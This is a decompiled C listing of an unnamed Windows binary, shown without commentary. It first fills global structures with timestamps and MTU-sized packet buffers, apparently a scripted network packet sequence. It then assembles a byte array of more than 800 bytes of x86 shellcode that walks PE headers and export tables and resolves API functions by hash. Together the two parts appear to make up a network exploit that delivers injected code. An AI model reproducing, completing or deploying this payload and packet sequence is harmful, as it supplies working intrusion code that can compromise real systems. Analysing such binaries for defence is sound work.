  dword_4B2FCC = 1;
  dword_4B2FD0 = 1233;
  qmemcpy(byte_4B2FD4, &aPxqiz0o6nbhx0b[1460], 0x4D0u);
  byte_4B2FD4[1232] = aPxqiz0o6nbhx0b[2692];
  dword_4B56E8 = -536870912;
  dword_4B56EC = 1058125176;
  word_4B56F0 = 0;
  dword_4B56F4 = 1;
  dword_4B56F8 = 95;
  qmemcpy(&unk_4B56FC, &unk_42A964, 0x5Fu);
  word_4BA540 = 2;
  dword_4BA544 = 2;
  dword_4BCC6C = 2;
  dword_4B7E10 = 400097280;
  dword_4B7E14 = 1073414392;
  word_4B7E18 = 1;
  dword_4B7E1C = 1;
  dword_4BA538 = -1320550400;
  dword_4BA53C = 1070483006;
  dword_4BCC60 = -374341632;
  dword_4BCC64 = 1067529164;
  word_4BCC68 = 0;
  dword_4BCC70 = 137;
  qmemcpy(&unk_4BCC74, &unk_42A9C4, 0x89u);
  dword_4BF394 = 2;
  dword_4C1ABC = 2;
  dword_4BF388 = 939524096;
  dword_4BF38C = 1059065425;
  word_4BF390 = 1;
  dword_4C1AB0 = -201326592;
  dword_4C1AB4 = 1065901353;
  word_4C1AB8 = 0;
  dword_4C1AC0 = 85;
  qmemcpy(&unk_4C1AC4, &unk_42AA50, 0x41u);
  dword_4C690C = 3;
  dword_4CB75C = 3;
  dword_4C41D8 = -442499072;
  dword_4C41DC = 1065819919;
  word_4C41E0 = 1;
  dword_4C41E4 = 2;
  dword_4C6900 = -1126170624;
  dword_4C6904 = 1065650933;
  word_4C6908 = 2;
  dword_4C9028 = 1080033280;
  dword_4C902C = 1067710577;
  word_4C9030 = 2;
  dword_4C9034 = 4;
  dword_4CB750 = -1291845632;
  dword_4CB754 = 1065807991;
  word_4CB758 = 0;
  dword_4CB760 = 132;
  dword_4CB764 = -134283264;
  dword_4CB768 = 1112364030;
  dword_4CDE78 = -268435456;
  dword_4CDE7C = 1059402940;
  word_4CDE80 = 2;
  dword_4CDE84 = 5;
  dword_4D05A0 = -281018368;
  dword_4D05A4 = 1065626792;
  word_4D05A8 = 0;
  dword_4D05AC = 4;
  dword_4D05B0 = 132;
  dword_4D05B4 = -134283264;
  dword_4D05B8 = 1112364030;
  dword_4D2CC8 = 0x80000000;
  dword_4D2CCC = 1057324334;
  word_4D2CD0 = 0;
  dword_4D2CD4 = 5;
  dword_4D2CD8 = 132;
  dword_4D2CDC = -134283264;
  dword_4D2CE0 = 1112364030;
  dword_4D53F0 = -536870912;
  dword_4D53F4 = 1057761905;
  word_4D53F8 = 2;
  dword_4D53FC = 6;
  dword_4D7B18 = -1274019840;
  dword_4D7B1C = 1066418430;
  word_4D7B20 = 0;
  dword_4D7B24 = 6;
  dword_4D7B28 = 132;
  dword_4D7B2C = -134283264;
  dword_4D7B30 = 1112364030;
  dword_4DA240 = -268435456;
  dword_4DA244 = 1058109611;
  word_4DA248 = 2;
  dword_4DA24C = 7;
  dword_4DC968 = -1747976192;
  dword_4DC96C = 1066740635;
  word_4DC970 = 2;
  dword_4DC974 = 8;
  dword_4DF090 = -1396703232;
  dword_4DF094 = 1065832502;
  word_4DF098 = 0;
  dword_4DF09C = 7;
  dword_4DF0A0 = 132;
  dword_4DF0A4 = -134283264;
  dword_4DF0A8 = 1112364030;
  dword_4E17B8 = -805306368;
  dword_4E17BC = 1058977624;
  word_4E17C0 = 0;
  dword_4E17C4 = 8;
  dword_4E17C8 = 132;
  word_4E3EE8 = 2;
  word_4E6610 = 2;
  word_4EDB88 = 2;
  word_4F02B0 = 2;
  word_4F5100 = 2;
  word_4F9F50 = 2;
  word_4FEDA0 = 2;
  word_503BF0 = 2;
  dword_4E17CC = -134283264;
  dword_4E17D0 = 1112364030;
  dword_4E3EE0 = -2013265920;
  dword_4E3EE4 = 1059226443;
  dword_4E3EEC = 9;
  dword_4E6608 = -787480576;
  dword_4E660C = 1066460465;
  dword_4E6614 = 10;
  dword_4E8D30 = -994050048;
  dword_4E8D34 = 1065756898;
  word_4E8D38 = 0;
  dword_4E8D3C = 9;
  dword_4E8D40 = 132;
  dword_4E8D44 = -134283264;
  dword_4E8D48 = 1112364030;
  dword_4EB458 = -536870912;
  dword_4EB45C = 1059003995;
  word_4EB460 = 0;
  dword_4EB464 = 10;
  dword_4EB468 = 132;
  dword_4EB46C = -134283264;
  dword_4EB470 = 1112364030;
  dword_4EDB80 = 0;
  dword_4EDB84 = 1059275724;
  dword_4EDB8C = 11;
  dword_4F02A8 = 822083584;
  dword_4F02AC = 1066465733;
  dword_4F02B4 = 12;
  dword_4F29D0 = 564133888;
  dword_4F29D4 = 1066513438;
  word_4F29D8 = 0;
  dword_4F29DC = 11;
  dword_4F29E0 = 132;
  dword_4F29E4 = -134283264;
  dword_4F29E8 = 1112364030;
  dword_4F50F8 = 1744830464;
  dword_4F50FC = 1059122273;
  dword_4F5104 = 13;
  dword_4F7820 = 1642070016;
  dword_4F7824 = 1065958633;
  word_4F7828 = 0;
  dword_4F782C = 12;
  dword_4F7830 = 132;
  dword_4F7834 = -134283264;
  dword_4F7838 = 1112364030;
  dword_4F9F48 = 805306368;
  dword_4F9F4C = 1059215474;
  dword_4F9F54 = 14;
  dword_4FC670 = 838860800;
  dword_4FC674 = 1066377327;
  word_4FC678 = 0;
  dword_4FC67C = 13;
  dword_4FC680 = 132;
  dword_4FC684 = -134283264;
  dword_4FC688 = 1112364030;
  dword_4FED98 = 939524096;
  dword_4FED9C = 1059251105;
  dword_4FEDA4 = 15;
  dword_5014C0 = 773849088;
  dword_5014C4 = 1065641126;
  word_5014C8 = 0;
  dword_5014CC = 14;
  dword_5014D0 = 132;
  dword_5014D4 = -134283264;
  dword_5014D8 = 1112364030;
  dword_503BE8 = -1744830464;
  dword_503BEC = 1059186955;
  dword_503BF4 = 16;
  dword_506310 = -53477376;
  dword_506314 = 1066667626;
  word_506318 = 0;
  dword_50631C = 15;
  dword_506324 = -134283264;
  dword_506328 = 1112364030;
  dword_508A44 = 16;
  dword_506320 = 132;
  dword_508A38 = 1879048192;
  dword_508A3C = 1059063200;
  word_508A40 = 0;
  dword_508A48 = 137;
  qmemcpy(&unk_508A4C, &unk_42AA94, 0x89u);
  dword_50B16C = 16;
  dword_50D894 = 16;
  dword_50B160 = 1744830464;
  dword_50B164 = 1059381543;
  word_50B168 = 1;
  dword_50D888 = 0x20000000;
  dword_50D88C = 1065627014;
  word_50D890 = 0;
  dword_50D898 = 85;
  qmemcpy(&unk_50D89C, &unk_42AB20, 0x55u);
  dword_514E0C = 17;
  dword_517534 = 17;
  dword_5126E4 = 2;
  word_514E08 = 2;
  word_519C58 = 2;
  word_51C380 = 2;
  word_5211D0 = 2;
  word_526020 = 2;
  dword_50FFB0 = -671088640;
  dword_50FFB4 = 1065665852;
  word_50FFB8 = 1;
  dword_50FFBC = 16;
  dword_5126D8 = -710934528;
  dword_5126DC = 1065647538;
  word_5126E0 = 3;
  dword_514E00 = -805306368;
  dword_514E04 = 1066295600;
  dword_517528 = 127926272;
  dword_51752C = 1066898312;
  word_517530 = 0;
  dword_517538 = 132;
  dword_51753C = -134283264;
  dword_517540 = 1112364030;
  dword_519C50 = -1073741824;
  dword_519C54 = 1057974695;
  dword_519C5C = 18;
  dword_51C378 = 1812987904;
  dword_51C37C = 1066627000;
  dword_51C384 = 19;
  dword_51EAA0 = -119537664;
  dword_51EAA4 = 1065805867;
  word_51EAA8 = 0;
  dword_51EAAC = 18;
  dword_51EAB0 = 132;
  dword_51EAB4 = -134283264;
  dword_51EAB8 = 1112364030;
  dword_5211C8 = 0x20000000;
  dword_5211CC = 1057652092;
  dword_5211D4 = 20;
  dword_5238F0 = 1871708160;
  dword_5238F4 = 1066430733;
  word_5238F8 = 0;
  dword_5238FC = 19;
  dword_523900 = 132;
  dword_523904 = -134283264;
  dword_523908 = 1112364030;
  dword_526018 = -1073741824;
  dword_52601C = 1058075784;
  dword_526024 = 21;
  dword_528754 = -134283264;
  dword_528758 = 1112364030;
  dword_52AE74 = 21;
  dword_52AE7C = -134283264;
  dword_52AE80 = 1112364030;
  dword_528740 = -694157312;
  dword_528744 = 1065879836;
  word_528748 = 0;
  dword_52874C = 20;
  dword_528750 = 132;
  dword_52AE68 = 0x40000000;
  dword_52AE6C = 1058349666;
  word_52AE70 = 0;
  dword_52AE78 = 132;
  dword_52D590 = -1476395008;
  dword_52D594 = 1059146127;
  word_52D598 = 3;
  dword_52D59C = 16;
  dword_52FCB8 = -1692205056;
  dword_52FCBC = 1072659792;
  word_52FCC0 = 0;
  dword_52FCC4 = 1;
  dword_52FCC8 = 95;
  qmemcpy(&unk_52FCCC, &unk_42AB78, 0x5Fu);
  dword_5323E0 = 0x80000000;
  dword_5323E4 = 1059281934;
  word_5323E8 = 1;
  dword_5323EC = 1;
  dword_534B08 = -601882624;
  dword_534B0C = 1065863024;
  word_534B10 = 0;
  dword_534B14 = 1;
  dword_534B18 = 1502;
  qmemcpy(&unk_534B1C, &unk_42ABD8, 0x5DEu);
  dword_537230 = -1371537408;
  dword_537234 = 1066050221;
  word_537238 = 0;
  dword_53723C = 1;
  dword_537240 = 1460;
  qmemcpy(&unk_537244, &unk_42B1B8, 0x5B4u);
  dword_539958 = 0x10000000;
  dword_53995C = 1060846787;
  word_539960 = 0;
  dword_539964 = 1;
  dword_539968 = 1233;
  qmemcpy(&unk_53996C, &unk_42B76C, 0x4D1u);
  dword_53C080 = 1879048192;
  dword_53C084 = 1058545963;
  word_53C088 = 1;
  dword_53C08C = 1;
  dword_53E7A8 = -977272832;
  dword_53E7AC = 1066746429;
  word_53E7B0 = 0;
  dword_53E7B4 = 3;
  dword_53E7B8 = 1460;
  qmemcpy(&unk_53E7BC, &unk_42BC40, 0x5B4u);
  dword_540ED0 = 1442840576;
  dword_540ED4 = 1065780872;
  word_540ED8 = 0;
  dword_540EDC = 3;
  dword_540EE0 = 1460;
  qmemcpy(&unk_540EE4, nullsub_3, 0x5B4u);
  dword_5435F8 = 1610612736;
  dword_5435FC = 1058321405;
  word_543600 = 0;
  dword_543604 = 4;
  dword_543608 = 1460;
  qmemcpy(&unk_54360C, &unk_42BC40, 0x5B4u);
  dword_545D20 = -704643072;
  dword_545D24 = 1064808121;
  word_545D28 = 0;
  dword_545D2C = 4;
  dword_545D30 = 1460;
  qmemcpy(&unk_545D34, nullsub_3, 0x5B4u);
  dword_548448 = -1073741824;
  dword_54844C = 1058570255;
  word_548450 = 0;
  dword_548454 = 5;
  dword_548458 = 1500;
  qmemcpy(&unk_54845C, &unk_42C7A8, 0x5DCu);
  dword_54AB70 = -1610612736;
  dword_54AB74 = 1057649652;
  word_54AB78 = 0;
  dword_54AB7C = 5;
  dword_54AB80 = 1420;
  qmemcpy(&unk_54AB84, &loc_42CD84, 0x58Cu);
  dword_54D298 = 0x40000000;
  dword_54D29C = 1057557259;
  word_54D2A0 = 0;
  dword_54D2A4 = 6;
  dword_54D2A8 = 1500;
  qmemcpy(&unk_54D2AC, &unk_42C7A8, 0x5DCu);
  dword_54F9C0 = 1501560832;
  dword_54F9C4 = 1064017083;
  word_54F9C8 = 0;
  dword_54F9CC = 6;
  dword_54F9D0 = 1420;
  qmemcpy(&unk_54F9D4, &unk_42D310, 0x58Cu);
  dword_5520E8 = 402653184;
  dword_5520EC = 1059753728;
  word_5520F0 = 0;
  dword_5520F4 = 7;
  dword_5520F8 = 1460;
  qmemcpy(&unk_5520FC, &unk_42BC40, 0x5B4u);
  dword_554810 = 0x80000000;
  dword_554814 = 1058345491;
  word_554818 = 0;
  dword_55481C = 7;
  dword_554820 = 1460;
  qmemcpy(&unk_554824, nullsub_3, 0x5B4u);
  dword_556F38 = -1811939328;
  dword_556F3C = 1060708437;
  word_556F40 = 0;
  dword_556F44 = 8;
  dword_556F48 = 1500;
  v1[0] = -63;
  qmemcpy(&unk_556F4C, &unk_42C7A8, 0x5DCu);
  dword_559660 = -1476395008;
  dword_559664 = 1059369388;
  word_559668 = 0;
  dword_55966C = 8;
  v1[1] = -25;
  v1[2] = 7;
  v1[3] = 41;
  v1[4] = -57;
  v1[5] = -119;
  v1[6] = -8;
  v1[7] = 49;
  v1[8] = -55;
  v1[9] = -118;
  v1[10] = 14;
  v1[11] = 0x80;
  v1[12] = -7;
  v1[13] = 0;
  v1[14] = 116;
  v1[15] = 5;
  v1[16] = 1;
  v1[17] = -56;
  v1[18] = 70;
  v1[19] = -21;
  v1[20] = -23;
  v1[21] = 95;
  v1[22] = 89;
  v1[23] = 94;
  v1[24] = -61;
  v1[25] = 86;
  v1[26] = 87;
  v1[27] = 82;
  v1[28] = -119;
  v1[29] = -58;
  v1[30] = 49;
  v1[31] = -64;
  v1[32] = -119;
  v1[33] = -57;
  v1[34] = -63;
  v1[35] = -25;
  v1[36] = 7;
  v1[37] = 41;
  v1[38] = -57;
  v1[39] = -119;
  v1[40] = -8;
  v1[41] = 49;
  v1[42] = -46;
  v1[43] = -118;
  v1[44] = 22;
  v1[45] = 1;
  v1[46] = -48;
  v1[47] = 70;
  v1[48] = -30;
  v1[49] = -18;
  v1[50] = 90;
  v1[51] = 95;
  v1[52] = 94;
  v1[53] = -61;
  v1[54] = 86;
  v1[55] = 81;
  v1[56] = 87;
  v1[57] = -119;
  v1[58] = -58;
  v1[59] = 49;
  v1[60] = -64;
  v1[61] = -119;
  v1[62] = -57;
  v1[63] = -63;
  v1[64] = -25;
  v1[65] = 7;
  v1[66] = 41;
  v1[67] = -57;
  v1[68] = -119;
  v1[69] = -8;
  v1[70] = 49;
  v1[71] = -55;
  v1[72] = -118;
  v1[73] = 14;
  v1[74] = 0x80;
  v1[75] = -7;
  v1[76] = 0;
  v1[77] = 116;
  v1[78] = -58;
  v1[79] = 1;
  v1[80] = -56;
  v1[81] = 70;
  v1[82] = 70;
  v1[83] = -21;
  v1[84] = -24;
  v1[85] = 95;
  v1[86] = 89;
  v1[87] = 94;
  v1[88] = -61;
  v1[89] = -125;
  v1[90] = -64;
  v1[91] = 24;
  v1[92] = -117;
  v1[93] = 0;
  v1[94] = -61;
  qmemcpy(&v1[95], "WVQ1", 4);
  v1[99] = -1;
  v1[100] = -119;
  v1[101] = -58;
  v1[102] = 57;
  v1[103] = -33;
  v1[104] = 116;
  v1[105] = 25;
  v1[106] = -117;
  v1[107] = 4;
  v1[108] = -70;
  v1[109] = 1;
  v1[110] = -16;
  v1[111] = -24;
  v1[112] = -125;
  v1[113] = -1;
  v1[114] = -1;
  v1[115] = -1;
  v1[116] = 57;
  v1[117] = -56;
  v1[118] = 116;
  v1[119] = 7;
  v1[120] = 71;
  v1[121] = -21;
  v1[122] = -21;
  v1[123] = 89;
  v1[124] = 94;
  v1[125] = 95;
  v1[126] = -61;
  v1[127] = -119;
  v1[128] = -8;
  v1[129] = -21;
  v1[130] = -8;
  v1[131] = 49;
  v1[132] = -64;
  v1[133] = -21;
  v1[134] = -12;
  v1[135] = -125;
  v1[136] = -63;
  v1[137] = 28;
  v1[138] = -117;
  v1[139] = 9;
  v1[140] = 1;
  v1[141] = -56;
  v1[142] = -61;
  v1[143] = -125;
  v1[144] = -63;
  v1[145] = 32;
  v1[146] = -117;
  v1[147] = 9;
  v1[148] = 1;
  v1[149] = -56;
  v1[150] = -61;
  v1[151] = -125;
  v1[152] = -63;
  v1[153] = 36;
  v1[154] = -117;
  v1[155] = 9;
  v1[156] = 1;
  v1[157] = -56;
  v1[158] = -61;
  v1[159] = -47;
  v1[160] = -31;
  v1[161] = 1;
  v1[162] = -56;
  v1[163] = 102;
  v1[164] = -117;
  v1[165] = 0;
  v1[166] = -61;
  v1[167] = -127;
  v1[168] = -30;
  v1[169] = -1;
  v1[170] = -1;
  v1[171] = 0;
  v1[172] = 0;
  v1[173] = -63;
  v1[174] = -30;
  v1[175] = 2;
  v1[176] = 1;
  v1[177] = -47;
  v1[178] = -117;
  v1[179] = 9;
  v1[180] = 1;
  v1[181] = -56;
  v1[182] = -61;
  v1[183] = 82;
  v1[184] = 86;
  v1[185] = -117;
  v1[186] = 116;
  v1[187] = 36;
  v1[188] = 12;
  v1[189] = -117;
  v1[190] = 76;
  v1[191] = 36;
  v1[192] = 16;
  v1[193] = 49;
  v1[194] = -46;
  v1[195] = -47;
  v1[196] = -23;
  v1[197] = -123;
  v1[198] = -55;
  v1[199] = 116;
  v1[200] = 12;
  v1[201] = -63;
  v1[202] = -62;
  v1[203] = 5;
  v1[204] = -84;
  v1[205] = 70;
  v1[206] = 12;
  v1[207] = 32;
  v1[208] = 48;
  v1[209] = -62;
  v1[210] = 73;
  v1[211] = -21;
  v1[212] = -16;
  v1[213] = -119;
  v1[214] = -48;
  v1[215] = 94;
  v1[216] = 90;
  v1[217] = -62;
  v1[218] = 8;
  v1[219] = 0;
  v1[220] = 88;
  v1[221] = 90;
  v1[222] = 95;
  v1[223] = 94;
  v1[224] = 80;
  v1[225] = 86;
  v1[226] = -119;
  v1[227] = -16;
  v1[228] = -125;
  v1[229] = -58;
  v1[230] = 60;
  v1[231] = -117;
  v1[232] = 54;
  v1[233] = 1;
  v1[234] = -58;
  v1[235] = 49;
  v1[236] = -64;
  v1[237] = -119;
  v1[238] = -63;
  v1[239] = 102;
  v1[240] = -117;
  v1[241] = 78;
  v1[242] = 6;
  v1[243] = 102;
  v1[244] = -117;
  v1[245] = 70;
  v1[246] = 20;
  v1[247] = 1;
  v1[248] = -58;
  v1[249] = -125;
  v1[250] = -58;
  v1[251] = 24;
  v1[252] = -123;
  v1[253] = -55;
  v1[254] = 116;
  v1[255] = 29;
  v1[256] = -117;
  v1[257] = 6;
  v1[258] = 57;
  v1[259] = -8;
  v1[260] = 117;
  v1[261] = 7;
  v1[262] = -117;
  v1[263] = 70;
  v1[264] = 4;
  v1[265] = 57;
  v1[266] = -48;
  v1[267] = 116;
  v1[268] = 6;
  v1[269] = -125;
  v1[270] = -58;
  v1[271] = 40;
  v1[272] = 73;
  v1[273] = -21;
  v1[274] = -23;
  v1[275] = -117;
  v1[276] = 70;
  v1[277] = 12;
  v1[278] = -117;
  v1[279] = 78;
  v1[280] = 8;
  v1[281] = 94;
  v1[282] = 1;
  v1[283] = -58;
  v1[284] = -61;
  v1[285] = 49;
  v1[286] = -10;
  v1[287] = -61;
  v1[288] = 96;
  v1[289] = 49;
  v1[290] = -64;
  v1[291] = -125;
  v1[292] = -8;
  v1[293] = 15;
  v1[294] = 116;
  v1[295] = 30;
  v1[296] = 49;
  v1[297] = -55;
  v1[298] = -117;
  v1[299] = 60;
  v1[300] = -122;
  v1[301] = -117;
  v1[302] = 20;
  v1[303] = -114;
  v1[304] = 57;
  v1[305] = -41;
  v1[306] = 116;
  v1[307] = 3;
  v1[308] = 65;
  v1[309] = 117;
  v1[310] = -13;
  v1[311] = 15;
  v1[312] = -74;
  v1[313] = -108;
  v1[314] = 3;
  v1[315] = -121;
  v1[316] = 3;
  v1[317] = 0;
  v1[318] = 0;
  v1[319] = 57;
  v1[320] = -47;
  v1[321] = 117;
  v1[322] = 13;
  v1[323] = 64;
  v1[324] = -21;
  v1[325] = -35;
  v1[326] = 65;
  v1[327] = 57;
  v1[328] = -56;
  v1[329] = 117;
  v1[330] = 5;
  v1[331] = 97;
  v1[332] = 49;
  v1[333] = -64;
  v1[334] = 64;
  v1[335] = -61;
  v1[336] = 97;
  v1[337] = 49;
  v1[338] = -64;
  v1[339] = -61;
  v1[340] = 0;
  v1[341] = 1;
  v1[342] = 2;
  v1[343] = 3;
  v1[344] = 4;
  v1[345] = 5;
  v1[346] = 6;
  v1[347] = 7;
  v1[348] = 8;
  v1[349] = 9;
  v1[350] = 10;
  v1[351] = 9;
  v1[352] = 9;
  v1[353] = 13;
  v1[354] = 14;
  v1[355] = -117;
  v1[356] = 76;
  v1[357] = 36;
  v1[358] = 8;
  v1[359] = 96;
  v1[360] = -24;
  v1[361] = 0;
  v1[362] = 0;
  v1[363] = 0;
  v1[364] = 0;
  v1[365] = 93;
  v1[366] = 102;
  v1[367] = -127;
  v1[368] = -27;
  v1[369] = 0;
  v1[370] = -16;
  v1[371] = -119;
  v1[372] = 77;
  v1[373] = 52;
  v1[374] = -24;
  v1[375] = -39;
  v1[376] = 1;
  v1[377] = 0;
  v1[378] = 0;
  v1[379] = -24;
  v1[380] = 67;
  v1[381] = 1;
  v1[382] = 0;
  v1[383] = 0;
  v1[384] = -24;
  v1[385] = 127;
  v1[386] = 1;
  v1[387] = 0;
  v1[388] = 0;
  v1[389] = -123;
  v1[390] = -64;
  v1[391] = 15;
  v1[392] = -124;
  v1[393] = -29;
  v1[394] = 0;
  v1[395] = 0;
  v1[396] = 0;
  v1[397] = -117;
  v1[398] = 93;
  v1[399] = 60;
  v1[400] = -117;
  v1[401] = 75;
  v1[402] = -40;
  v1[403] = -24;
  v1[404] = 23;
  v1[405] = 1;
  v1[406] = 0;
  v1[407] = 0;
  v1[408] = 60;
  v1[409] = 35;
  v1[410] = 116;
  v1[411] = 13;
  v1[412] = 60;
  v1[413] = 119;
  v1[414] = 116;
  v1[415] = 28;
  v1[416] = 60;
  v1[417] = -56;
  v1[418] = 116;
  v1[419] = 34;
  v1[420] = -23;
  v1[421] = -74;
  v1[422] = 0;
  v1[423] = 0;
  v1[424] = 0;
  v1[425] = -117;
  v1[426] = 77;
  v1[427] = 56;
  v1[428] = -117;
  v1[429] = 69;
  v1[430] = 36;
  v1[431] = -119;
  v1[432] = 65;
  v1[433] = 14;
  v1[434] = 49;
  v1[435] = -64;
  v1[436] = -120;
  v1[437] = 65;
  v1[438] = 18;
  v1[439] = -23;
  v1[440] = -97;
  v1[441] = 0;
  v1[442] = 0;
  v1[443] = 0;
  v1[444] = -24;
  v1[445] = 19;
  v1[446] = 1;
  v1[447] = 0;
  v1[448] = 0;
  v1[449] = -23;
  v1[450] = -75;
  v1[451] = 0;
  v1[452] = 0;
  v1[453] = 0;
  v1[454] = -117;
  v1[455] = 93;
  v1[456] = 60;
  v1[457] = -117;
  v1[458] = 67;
  v1[459] = -24;
  v1[460] = -117;
  v1[461] = 48;
  v1[462] = 51;
  v1[463] = 117;
  v1[464] = 40;
  v1[465] = -117;
  v1[466] = 120;
  v1[467] = 8;
  v1[468] = 51;
  v1[469] = 125;
  v1[470] = 40;
  v1[471] = -117;
  v1[472] = 64;
  v1[473] = 4;
  v1[474] = 51;
  v1[475] = 69;
  v1[476] = 40;
  v1[477] = 59;
  v1[478] = 67;
  v1[479] = 16;
  v1[480] = -119;
  v1[481] = -61;
  v1[482] = 117;
  v1[483] = 123;
  v1[484] = -117;
  v1[485] = 77;
  v1[486] = 48;
  v1[487] = 57;
  v1[488] = -15;
  v1[489] = -117;
  v1[490] = 69;
  v1[491] = 44;
  v1[492] = 116;
  v1[493] = 24;
  v1[494] = -24;
  v1[495] = -14;
  v1[496] = 0;
  v1[497] = 0;
  v1[498] = 0;
  v1[499] = -115;
  v1[500] = 70;
  v1[501] = 4;
  strcpy(&v1[502], "Pj");
  v1[505] = -1;
  v1[506] = 85;
  v1[507] = 8;
  v1[508] = -123;
  v1[509] = -64;
  v1[510] = 116;
  v1[511] = 99;
  v1[512] = -119;
  v1[513] = 69;
  v1[514] = 44;
  v1[515] = -119;
  v1[516] = 117;
  v1[517] = 48;
  v1[518] = 1;
  v1[519] = -33;
  v1[520] = 57;
  v1[521] = -9;
  v1[522] = 119;
  v1[523] = 83;
  v1[524] = 41;
  v1[525] = -33;
  v1[526] = 1;
  v1[527] = -57;
  v1[528] = 87;
  v1[529] = -119;
  v1[530] = -14;
  v1[531] = -117;
  v1[532] = 117;
  v1[533] = 60;
  v1[534] = -117;
  v1[535] = 118;
  v1[536] = -16;
  v1[537] = -119;
  v1[538] = -39;
  v1[539] = -13;
  v1[540] = -92;
  v1[541] = 94;
  v1[542] = -119;
  v1[543] = -39;
  v1[544] = -63;
  v1[545] = -23;
  v1[546] = 2;
  v1[547] = -117;
  v1[548] = 93;
  v1[549] = 40;
  v1[550] = 49;
  v1[551] = 30;
  v1[552] = -125;
  v1[553] = -58;
  v1[554] = 4;
  v1[555] = -30;
  v1[556] = -7;
  v1[557] = 1;
  v1[558] = -48;
  v1[603] = -80;
  v1[607] = -80;
  v1[611] = -80;
  v1[559] = 57;
  v1[560] = -58;
  v1[561] = 124;
  v1[562] = 40;
  v1[563] = -117;
  v1[564] = 69;
  v1[565] = 44;
  v1[566] = 96;
  v1[567] = -119;
  v1[568] = -26;
  v1[569] = 80;
  v1[570] = -1;
  v1[571] = -48;
  v1[572] = -119;
  v1[573] = -12;
  v1[574] = 97;
  v1[575] = -24;
  v1[576] = -95;
  v1[577] = 0;
  v1[578] = 0;
  v1[579] = 0;
  v1[580] = -117;
  v1[581] = 69;
  v1[582] = 36;
  v1[583] = -47;
  v1[584] = -24;
  v1[585] = 49;
  v1[586] = -55;
  v1[587] = -120;
  v1[588] = -63;
  v1[589] = 1;
  v1[590] = -23;
  v1[591] = -117;
  v1[592] = 9;
  v1[593] = 49;
  v1[594] = -56;
  v1[595] = -119;
  v1[596] = 69;
  v1[597] = 36;
  v1[598] = -24;
  v1[599] = 104;
  v1[600] = 0;
  v1[601] = 0;
  v1[602] = 0;
  v1[604] = 16;
  v1[605] = -21;
  v1[606] = 8;
  v1[608] = 32;
  v1[609] = -21;
  v1[610] = 4;
  v1[612] = 48;
  v1[613] = -21;
  v1[614] = 0;
  v1[615] = -117;
  v1[616] = 77;
  v1[617] = 56;
  v1[618] = -76;
  v1[619] = 0;
  v1[620] = 102;
  v1[621] = 1;
  v1[622] = 65;
  v1[623] = 30;
  v1[624] = -117;
  v1[625] = 69;
  v1[626] = 16;
  v1[627] = -119;
  v1[628] = 68;
  v1[629] = 36;
  v1[630] = 28;
  v1[631] = 97;
  v1[632] = -1;
  v1[633] = 96;
  v1[634] = 60;
  v1[635] = -115;
  v1[636] = 69;
  v1[637] = 72;
  v1[638] = -117;
  v1[639] = 77;
  v1[640] = 12;
  v1[641] = -119;
  v1[642] = -120;
  v1[643] = 71;
  v1[644] = 1;
  v1[645] = 0;
  v1[646] = 0;
  v1[647] = -119;
  v1[648] = -88;
  v1[649] = 62;
  v1[650] = 1;
  v1[651] = 0;
  v1[652] = 0;
  v1[653] = 102;
  v1[654] = -72;
  v1[655] = 16;
  v1[656] = 0;
  v1[657] = -117;
  v1[658] = 77;
  v1[659] = 56;
  v1[660] = 102;
  v1[661] = 1;
  v1[662] = 65;
  v1[663] = 30;
  v1[664] = -117;
  v1[665] = 69;
  v1[666] = 16;
  v1[667] = -119;
  v1[668] = 68;
  v1[669] = 36;
  v1[670] = 28;
  strcpy(&v1[671], "ah");
  v1[674] = 0;
  v1[675] = 0;
  v1[676] = 0;
  v1[677] = -117;
  strcpy(&v1[678], "@<Ph");
  v1[683] = 0;
  v1[684] = 0;
  v1[685] = 0;
  v1[686] = -61;
  v1[687] = 49;
  v1[688] = -64;
  v1[689] = -120;
  v1[690] = -56;
  v1[691] = -63;
  v1[692] = -23;
  v1[693] = 8;
  v1[694] = 0;
  v1[695] = -56;
  v1[696] = -63;
  v1[697] = -23;
  v1[698] = 8;
  v1[699] = 0;
  v1[700] = -56;
  v1[701] = -63;
  v1[702] = -23;
  v1[703] = 8;
  v1[704] = 0;
  v1[705] = -56;
  v1[706] = -61;
  v1[707] = 81;
  v1[708] = -117;
  v1[709] = 69;
  v1[710] = 36;
  v1[711] = -119;
  v1[712] = -63;
  v1[713] = 15;
  v1[714] = -55;
  v1[715] = -47;
  v1[716] = -32;
  v1[717] = 49;
  v1[718] = -56;
  v1[719] = -119;
  v1[720] = 69;
  v1[721] = 40;
  v1[722] = 89;
  v1[723] = -61;
  v1[724] = 96;
  v1[725] = -24;
  v1[726] = 11;
  v1[727] = 0;
  v1[728] = 0;
  v1[729] = 0;
  v1[730] = -117;
  v1[731] = 69;
  v1[732] = 16;
  v1[733] = -117;
  v1[734] = 72;
  v1[735] = 60;
  v1[736] = -119;
  v1[737] = 72;
  v1[738] = 56;
  v1[739] = 97;
  v1[740] = -61;
  v1[741] = 96;
  v1[742] = -117;
  v1[743] = 93;
  v1[744] = 44;
  v1[745] = -123;
  v1[746] = -37;
  v1[747] = 116;
  v1[748] = 13;
  v1[749] = 49;
  v1[750] = -64;
  v1[751] = -119;
  v1[752] = -33;
  v1[753] = -117;
  v1[754] = 77;
  v1[755] = 48;
  v1[756] = -13;
  v1[757] = -86;
  v1[758] = 83;
  v1[759] = -1;
  v1[760] = 85;
  v1[761] = 12;
  v1[762] = 49;
  v1[763] = -64;
  v1[764] = -119;
  v1[765] = 69;
  v1[766] = 48;
  v1[767] = -119;
  v1[768] = 69;
  v1[769] = 44;
  v1[770] = 97;
  v1[771] = -61;
  v1[772] = 87;
  v1[773] = 82;
  v1[774] = 86;
  v1[775] = -119;
  v1[776] = -49;
  v1[777] = -117;
  v1[778] = 85;
  v1[779] = 68;
  v1[780] = -117;
  v1[781] = 10;
  v1[782] = -24;
  v1[783] = 57;
  v1[784] = 0;
  v1[785] = 0;
  v1[786] = 0;
  v1[787] = -123;
  v1[788] = -64;
  v1[789] = 117;
  v1[790] = 14;
  v1[791] = -125;
  v1[792] = -62;
  v1[793] = 8;
  v1[794] = -117;
  v1[795] = 10;
  v1[796] = -24;
  v1[797] = 43;
  v1[798] = 0;
  v1[799] = 0;
  v1[800] = 0;
  v1[801] = -123;
  v1[802] = -64;
  v1[803] = 116;
  v1[804] = 33;
  v1[805] = -119;
  v1[806] = 77;
  v1[807] = 68;
  v1[808] = 106;
  v1[809] = 12;
  v1[810] = 88;
  v1[811] = -115;
  v1[812] = 113;
  v1[813] = 84;
  v1[814] = 59;
  v1[815] = 6;
  v1[816] = 116;
  v1[817] = 7;
  v1[818] = -125;
  v1[819] = -58;
  v1[820] = 4;
  v1[821] = 59;
  v1[822] = 6;
